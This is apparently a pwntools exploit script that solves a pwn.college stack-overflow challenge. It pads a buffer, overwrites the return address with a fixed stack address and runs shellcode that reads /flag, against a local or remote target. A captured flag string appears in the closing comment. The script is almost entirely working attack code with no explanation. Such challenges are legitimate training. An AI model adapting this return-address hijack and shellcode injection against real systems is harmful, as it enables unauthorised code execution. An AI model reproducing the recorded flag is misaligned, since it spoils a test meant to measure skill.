#!/usr/bin/env python3
from pwn import *

context.terminal = ['kitty', '-e']

exe = context.binary = ELF('./binary-exploitation-hijack-to-shellcode-w', checksec=False)
libc = exe.libc

gdbscript = '''

'''

def start(argv=[]):
    if args.LOCAL:
        p = exe.process()
        if args.GDB:
            gdb.attach(p, gdbscript=gdbscript)
            pause()
    elif args.REMOTE:
        host_port = sys.argv[1:]
        p = remote(host_port[0], int(host_port[1]))
    return p

p = start()
input()
stack_addr = 0x7fffffffc848 + 8

payload = b'A' * (48 + 8)
print(len(payload))
payload += p64(stack_addr)
payload += asm(shellcraft.cat('/flag'))

p.sendline(payload)
p.interactive()

#pwn.college{4vMaPdcWVvOu6ozjsIoOO4W2eFu.dFjMzwCMxADNwEzW}